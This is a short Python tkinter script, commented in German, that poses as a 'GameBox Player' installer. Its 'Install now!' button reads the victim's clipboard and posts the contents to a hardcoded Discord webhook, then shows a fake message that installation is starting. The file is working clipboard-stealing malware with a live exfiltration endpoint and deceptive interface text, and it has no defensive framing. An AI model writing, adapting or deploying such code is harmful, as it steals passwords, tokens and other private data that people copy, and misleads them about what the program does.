import tkinter as tk
from tkinter import messagebox
import requests
import pyperclip

# Discord Webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1381552461592133632/Hv4KIhrffNlsdoLwBC1zHqpuhofOMwQEGeHESz8DfJ0bQ5029T3C4DgSky2Zow5MF5Af"

# Tkinter vorbereiten
root = tk.Tk()
root.withdraw()  # Hauptfenster ausblenden für den Start

# Sicherheitsabfrage anzeigen
confirm = messagebox.askyesno(
    "Warnung",
    "GameBox Player wird installiert aber du musst den ToS zustimmen. Wo du die findest? Hier: https://bit.ly/notanrickroll"
)

if confirm:
    root.deiconify()  # Hauptfenster wieder sichtbar machen
    root.title("GameBox Installer")
    root.geometry("300x120")

    def send_clipboard():
        content = pyperclip.paste()
        if content:
            data = {
                "content": f"📋 **Clipboard-Inhalt:**\n```{content}```"
            }
            response = requests.post(WEBHOOK_URL, json=data)
            if response.status_code == 204:
                messagebox.showinfo("Erfolg", "Installation will be starting soon...")
            else:
                messagebox.showerror("Fehler", f"Error occurred: {response.status_code}")
        else:
            messagebox.showwarning("Leer", "Cannot install right now. Try again later.")

    # GUI aufbauen
    tk.Label(root, text="Run installer.", font=("Arial", 13)).pack(pady=10)
    tk.Button(root, text="Install now!", command=send_clipboard).pack(pady=10)

    root.mainloop()
else:
    print("No Installation!")
    root.destroy()
